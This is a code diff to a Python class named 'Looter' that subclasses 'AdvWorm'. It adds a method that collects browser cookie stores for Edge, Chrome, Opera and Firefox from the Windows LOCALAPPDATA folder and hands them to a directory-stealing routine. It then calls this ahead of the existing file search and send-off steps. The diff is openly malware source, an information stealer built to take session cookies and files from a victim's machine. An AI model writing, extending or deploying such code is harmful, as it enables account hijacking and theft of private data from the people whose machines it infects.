@@ -8,7 +8,10 @@ class Looter(AdvWorm):
         self.winDir = {{LOOTER_ENV_VARIABLE}}
         self.extFile = {{LOOTER_EXT_FILE}}
         self.tooCapture = set()
-
+        self.dir2steal = []
+        self.IG = IndexGen()
+        self.cookiesLoc = {"MS_edge": "\\Microsoft\\Edge\\User Data\\Default\\Network", "Chrome": "\\Google\\Chrome\\User Data\\Default\\Network",
+        "Opera": "\\Opera Software\\Opera Stable\\Network", "FireFox": "\\Mozilla\\Firefox\\Profiles"}
 
     
     def getWinDir(self) -> None:
@@ -46,12 +49,24 @@ class Looter(AdvWorm):
         for fp in self.tooCapture:
             self.sendFile(fp[0], fp[1])
     
+    def stealCookies(self) -> None:
+        prefix = os.getenv("LOCALAPPDATA")
+        for n, p in self.cookiesLoc.items():
+            print(prefix + p)
+            self._stealDir(str(prefix) + p, "cookies", f"Cookies from {n}")
+        sleep(1)
+        self.sendMsg("END Cookies !!")
+    
+    
+            
+    
     def Work(self):
+        
         print("Try Send file")
         sleep(0.5)
+        self.stealCookies()
+        sleep(2)
         self.getWinDir()
         self.findFile()
         print("START DOWNLOAD")
         self.sendAllFile()
-
-
